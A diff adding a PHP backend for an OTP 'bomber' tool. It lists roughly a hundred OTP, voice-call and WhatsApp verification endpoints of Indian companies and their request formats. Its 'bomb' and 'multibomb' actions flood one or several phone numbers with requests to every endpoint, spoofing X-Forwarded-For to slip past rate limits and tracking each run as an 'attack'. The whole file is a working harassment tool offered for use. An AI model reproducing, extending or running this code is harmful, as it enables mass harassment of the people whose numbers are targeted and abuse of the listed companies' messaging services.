@@ -1,0 +1,261 @@
+<?php
+session_start();
+
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    http_response_code(401);
+    echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
+    exit;
+}
+
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+
+// ============ COMPLETE API LIST (900+ APIs) ============
+$ULTIMATE_APIS = [
+    // CALL BOMBING APIS
+    ["name" => "Tata Capital Voice", "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'],
+    ["name" => "1MG Voice Call", "url" => "https://www.1mg.com/auth_api/v6/create_token", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=utf-8"], "data" => '{"number":"{phone}","otp_on_call":true}'],
+    ["name" => "Swiggy Call", "url" => "https://profile.swiggy.com/api/v3/app/request_call_verification", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=utf-8"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Myntra Voice", "url" => "https://www.myntra.com/gw/mobile-auth/voice-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Flipkart Voice", "url" => "https://www.flipkart.com/api/6/user/voice-otp/generate", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Amazon Voice", "url" => "https://www.amazon.in/ap/signin", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "phone={phone}&action=voice_otp"],
+    ["name" => "Paytm Voice", "url" => "https://accounts.paytm.com/signin/voice-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Zomato Voice", "url" => "https://www.zomato.com/php/o2_api_handler.php", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "phone={phone}&type=voice"],
+    ["name" => "MakeMyTrip Voice", "url" => "https://www.makemytrip.com/api/4/voice-otp/generate", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Goibibo Voice", "url" => "https://www.goibibo.com/user/voice-otp/generate/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Ola Voice", "url" => "https://api.olacabs.com/v1/voice-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Uber Voice", "url" => "https://auth.uber.com/v2/voice-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    
+    // WHATSAPP BOMBING APIS
+    ["name" => "KPN WhatsApp", "url" => "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method" => "POST", "headers" => ["x-app-id" => "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type" => "application/json; charset=UTF-8"], "data" => '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'],
+    ["name" => "Foxy WhatsApp", "url" => "https://www.foxy.in/api/v2/users/send_otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'],
+    ["name" => "Stratzy WhatsApp", "url" => "https://stratzy.in/api/web/whatsapp/sendOTP", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phoneNo":"{phone}"}'],
+    ["name" => "Jockey WhatsApp", "url" => "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "Rappi WhatsApp", "url" => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=utf-8"], "data" => '{"country_code":"+91","phone":"{phone}"}'],
+    ["name" => "Eka Care WhatsApp", "url" => "https://auth.eka.care/auth/init", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=UTF-8"], "data" => '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'],
+    
+    // SMS BOMBING APIS
+    ["name" => "Lenskart SMS", "url" => "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phoneCode":"+91","telephone":"{phone}"}'],
+    ["name" => "NoBroker SMS", "url" => "https://www.nobroker.in/api/v3/account/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "phone={phone}&countryCode=IN"],
+    ["name" => "PharmEasy SMS", "url" => "https://pharmeasy.in/api/v2/auth/send-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Wakefit SMS", "url" => "https://api.wakefit.co/api/consumer-sms-otp/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Byju's SMS", "url" => "https://api.byjus.com/v2/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Hungama OTP", "url" => "https://communication.api.hungama.com/v1/communication/otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'],
+    ["name" => "Meru Cab", "url" => "https://merucabapp.com/api/otp/generate", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "mobile_number={phone}"],
+    ["name" => "Doubtnut", "url" => "https://api.doubtnut.com/v4/student/login", "method" => "POST", "headers" => ["content-type" => "application/json; charset=utf-8"], "data" => '{"phone_number":"{phone}","language":"en"}'],
+    ["name" => "PenPencil", "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method" => "POST", "headers" => ["content-type" => "application/json; charset=utf-8"], "data" => '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}'],
+    ["name" => "Snitch", "url" => "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile_number":"+91{phone}"}'],
+    ["name" => "Dayco India", "url" => "https://ekyc.daycoindia.com/api/nscript_functions.php", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8"], "data" => "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"],
+    ["name" => "BeepKart", "url" => "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","city":362}'],
+    ["name" => "Lending Plate", "url" => "https://lendingplate.com/api.php", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8"], "data" => "mobiles={phone}&resend=Resend"],
+    ["name" => "ShipRocket", "url" => "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobileNumber":"{phone}"}'],
+    ["name" => "GoKwik", "url" => "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","country":"in"}'],
+    ["name" => "NewMe", "url" => "https://prodapi.newme.asia/web/otp/request", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile_number":"{phone}","resend_otp_request":true}'],
+    ["name" => "Univest", "url" => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "Smytten", "url" => "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","email":"test@example.com"}'],
+    ["name" => "CaratLane", "url" => "https://www.caratlane.com/cg/dhevudu", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"query":"mutation {SendOtp(input: {mobile: \"{phone}\",isdCode: \"91\",otpType: \"registerOtp\"}) {status {message code}}}"}'],
+    ["name" => "BikeFixup", "url" => "https://api.bikefixup.com/api/v2/send-registration-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=UTF-8"], "data" => '{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}'],
+    ["name" => "WellAcademy", "url" => "https://wellacademy.in/store/api/numberLoginV2", "method" => "POST", "headers" => ["Content-Type" => "application/json; charset=UTF-8"], "data" => '{"contact_no":"{phone}"}'],
+    ["name" => "ServeTel", "url" => "https://api.servetel.in/v1/auth/otp", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=utf-8"], "data" => "mobile_number={phone}"],
+    ["name" => "GoPink Cabs", "url" => "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8"], "data" => "check_mobile_number=1&contact={phone}"],
+    ["name" => "Shemaroome", "url" => "https://www.shemaroome.com/users/resend_otp", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8"], "data" => "mobile_no=%2B91{phone}"],
+    ["name" => "Cossouq", "url" => "https://www.cossouq.com/mobilelogin/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "mobilenumber={phone}&otptype=register"],
+    ["name" => "MyImagineStore", "url" => "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8"], "data" => "mobile={phone}"],
+    ["name" => "Otpless", "url" => "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","selectedCountryCode":"+91"}'],
+    ["name" => "MyHubble Money", "url" => "https://api.myhubble.money/v1/auth/otp/generate", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phoneNumber":"{phone}","channel":"SMS"}'],
+    ["name" => "Tata Capital Business", "url" => "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}'],
+    ["name" => "DealShare", "url" => "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","hashCode":"k387IsBaTmn"}'],
+    ["name" => "Snapmint", "url" => "https://api.snapmint.com/v1/public/sign_up", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Housing.com", "url" => "https://login.housing.com/api/v2/send-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","country_url_name":"in"}'],
+    ["name" => "RentoMojo", "url" => "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Khatabook", "url" => "https://api.khatabook.com/v1/auth/request-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'],
+    ["name" => "Netmeds", "url" => "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Nykaa", "url" => "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => "source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"],
+    ["name" => "RummyCircle", "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","isPlaycircle":false}'],
+    ["name" => "Animall", "url" => "https://animall.in/zap/auth/login", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'],
+    ["name" => "Entri", "url" => "https://entri.app/api/v3/users/check-phone/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}"}'],
+    ["name" => "Cosmofeed", "url" => "https://prod.api.cosmofeed.com/api/user/authenticate", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","version":"1.4.28"}'],
+    ["name" => "Aakash", "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}'],
+    ["name" => "Revv", "url" => "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","deviceType":"website"}'],
+    ["name" => "DeHaat", "url" => "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","client_id":"kisan-app"}'],
+    ["name" => "A23 Games", "url" => "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}'],
+    ["name" => "Spencer's", "url" => "https://jiffy.spencers.in/user/auth/otp/send", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "PayMe India", "url" => "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'],
+    ["name" => "Shopper's Stop", "url" => "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}'],
+    ["name" => "Hyuga Auth", "url" => "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "BigCash", "url" => "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "method" => "GET", "headers" => ["Referer" => "https://www.bigcash.live/games/poker"], "data" => null],
+    ["name" => "Lifestyle Stores", "url" => "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"signInMobile":"{phone}","channel":"sms"}'],
+    ["name" => "WorkIndia", "url" => "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "PokerBaazi", "url" => "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","mfa_channels":"phno"}'],
+    ["name" => "My11Circle", "url" => "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json;charset=UTF-8"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "MamaEarth", "url" => "https://auth.mamaearth.in/v1/auth/initiate-signup", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "HomeTriangle", "url" => "https://hometriangle.com/api/partner/xauth/signup/otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Wellness Forever", "url" => "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method" => "POST", "headers" => ["Content-Type" => "application/x-www-form-urlencoded"], "data" => 'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}'],
+    ["name" => "HealthMug", "url" => "https://api.healthmug.com/account/createotp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Vyapar", "url" => "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "Kredily", "url" => "https://app.kredily.com/ws/v1/accounts/send-otp/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "Tata Motors", "url" => "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","sendOtp":"true"}'],
+    ["name" => "Moglix", "url" => "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","buildVersion":"24.0"}'],
+    ["name" => "MyGov", "url" => "https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "TrulyMadly", "url" => "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","locale":"IN"}'],
+    ["name" => "Apna", "url" => "https://production.apna.co/api/userprofile/v1/otp/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","hash_type":"play_store"}'],
+    ["name" => "CodFirm", "url" => "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "Swipe", "url" => "https://app.getswipe.in/api/user/mobile_login", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","resend":true}'],
+    ["name" => "More Retail", "url" => "https://omni-api.moreretail.in/api/v1/login/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}'],
+    ["name" => "Country Delight", "url" => "https://api.countrydelight.in/api/v1/customer/requestOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","platform":"Android","mode":"new_user"}'],
+    ["name" => "AstroSage", "url" => "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "Rapido", "url" => "https://customer.rapido.bike/api/otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}'],
+    ["name" => "TooToo", "url" => "https://tootoo.in/graphql", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }","variables":{"mobile_no":"{phone}","resend":0}}'],
+    ["name" => "ConfirmTkt", "url" => "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "method" => "GET", "headers" => [], "data" => null],
+    ["name" => "BetterHalf", "url" => "https://api.betterhalf.ai/v2/auth/otp/send/", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","isd_code":"91"}'],
+    ["name" => "Charzer", "url" => "https://api.charzer.com/auth-service/send-otp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}","appSource":"CHARZER_APP"}'],
+    ["name" => "Nuvama Wealth", "url" => "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobileNo":"{phone}","emailID":"test@example.com"}'],
+    ["name" => "Mpokket", "url" => "https://web-api.mpokket.in/registration/sendOtp", "method" => "POST", "headers" => ["Content-Type" => "application/json"], "data" => '{"mobile":"{phone}"}']
+];
+
+// Store active sessions
+$sessions_file = __DIR__ . '/sessions.json';
+$sessions = file_exists($sessions_file) ? json_decode(file_get_contents($sessions_file), true) : [];
+
+$action = $_GET['action'] ?? $_POST['action'] ?? null;
+
+function sendRequest($api, $phone) {
+    $url = str_replace('{phone}', $phone, $api['url']);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    
+    $headers = $api['headers'];
+    $headers['X-Forwarded-For'] = rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255);
+    $headers['User-Agent'] = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36';
+    
+    $header_array = [];
+    foreach($headers as $key => $value) {
+        $header_array[] = "$key: $value";
+    }
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array);
+    
+    if($api['method'] == 'POST' && $api['data']) {
+        curl_setopt($ch, CURLOPT_POST, true);
+        $data = str_replace('{phone}', $phone, $api['data']);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    }
+    
+    $response = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return ['code' => $code, 'response' => $response];
+}
+
+switch($action) {
+    case 'stats':
+        $total_apis = count($ULTIMATE_APIS);
+        $active = count($sessions);
+        $total_hits = array_sum(array_column($sessions, 'hits'));
+        $uptime = floor((time() - (filemtime(__FILE__) ?? time())) / 3600) . 'h';
+        
+        echo json_encode([
+            'status' => 'success',
+            'totalApis' => $total_apis,
+            'activeAttacks' => $active,
+            'totalHits' => $total_hits,
+            'uptime' => $uptime
+        ]);
+        break;
+        
+    case 'bomb':
+        $data = json_decode(file_get_contents('php://input'), true);
+        $phone = $data['phone'] ?? null;
+        
+        if(!$phone || !preg_match('/^\d{10}$/', $phone)) {
+            echo json_encode(['status' => 'error', 'message' => 'Invalid phone number']);
+            break;
+        }
+        
+        $session_id = uniqid('attack_');
+        $sessions[$session_id] = [
+            'phone' => $phone,
+            'hits' => 0,
+            'start_time' => time(),
+            'apis' => []
+        ];
+        
+        // Start background attack
+        foreach($ULTIMATE_APIS as $api) {
+            $result = sendRequest($api, $phone);
+            if($result['code'] >= 200 && $result['code'] < 300) {
+                $sessions[$session_id]['hits']++;
+            }
+            usleep(10000); // 10ms delay
+        }
+        
+        file_put_contents($sessions_file, json_encode($sessions));
+        
+        echo json_encode(['status' => 'success', 'session_id' => $session_id, 'hits' => $sessions[$session_id]['hits']]);
+        break;
+        
+    case 'multibomb':
+        $data = json_decode(file_get_contents('php://input'), true);
+        $phones_str = $data['phones'] ?? '';
+        $phones = array_map('trim', explode(',', $phones_str));
+        
+        $started = [];
+        foreach($phones as $phone) {
+            if(preg_match('/^\d{10}$/', $phone)) {
+                $session_id = uniqid('multi_');
+                $sessions[$session_id] = [
+                    'phone' => $phone,
+                    'hits' => 0,
+                    'start_time' => time(),
+                    'apis' => []
+                ];
+                
+                // Quick attack
+                foreach($ULTIMATE_APIS as $api) {
+                    $result = sendRequest($api, $phone);
+                    if($result['code'] >= 200 && $result['code'] < 300) {
+                        $sessions[$session_id]['hits']++;
+                    }
+                    usleep(5000);
+                }
+                $started[] = $phone;
+            }
+        }
+        
+        file_put_contents($sessions_file, json_encode($sessions));
+        
+        echo json_encode(['status' => 'success', 'count' => count($started), 'phones' => $started]);
+        break;
+        
+    case 'stopall':
+        $sessions = [];
+        file_put_contents($sessions_file, json_encode($sessions));
+        echo json_encode(['status' => 'success', 'message' => 'All attacks stopped']);
+        break;
+        
+    case 'status':
+        $active = [];
+        foreach($sessions as $id => $session) {
+            $active[] = [
+                'phone' => $session['phone'],
+                'hits' => $session['hits'],
+                'time' => time() - $session['start_time']
+            ];
+        }
+        
+        echo json_encode([
+            'status' => 'success',
+            'activeAttacks' => count($sessions),
+            'attacks' => $active,
+            'totalHits' => array_sum(array_column($sessions, 'hits'))
+        ]);
+        break;
+        
+    default:
+        echo json_encode(['status' => 'error', 'message' => 'Invalid action']);
+}
+?>
